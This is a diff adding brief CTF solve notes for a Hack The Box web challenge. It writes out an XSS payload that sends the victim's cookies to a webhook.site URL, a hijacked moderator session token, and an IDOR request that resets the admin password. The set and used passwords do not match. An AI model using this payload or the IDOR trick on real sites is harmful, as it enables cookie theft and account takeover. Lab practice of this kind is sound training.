@@ -1,0 +1,27 @@
+access: http://206.189.120.31:31385/
+
+script xss:
+<script>fetch('https://webhook.site/641ab205-0305-4694-84e9-0c4bbdf1f9b3/?cookie=' + document.cookie)</script>
+
+set cookies session to 
+session, eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2ODk1NDY2MjB9.O2vbN7VZ_ewgeKgajjsNAYJl9EShVgh2yMSe_DgpJvw
+
+access: http://206.189.120.31:31385/tickets
+loggin as moderator.
+
+click settings:
+change password:
+{"password":"123123","uid":"100"}
+
+change uid to 1 as admin some idor vulnerability:
+{"password":"123123","uid":"1"}
+
+access: http://206.189.120.31:31385/login
+username: admin
+password: 1231234
+
+result:
+HTB{p0pp1ng_x55_4nd_id0rs_ftw!}
+
+resource:
+https://infosecwriteups.com/cyber-apocalypse-ctf-2022-web-kryptos-support-write-up-2cf5057c4161
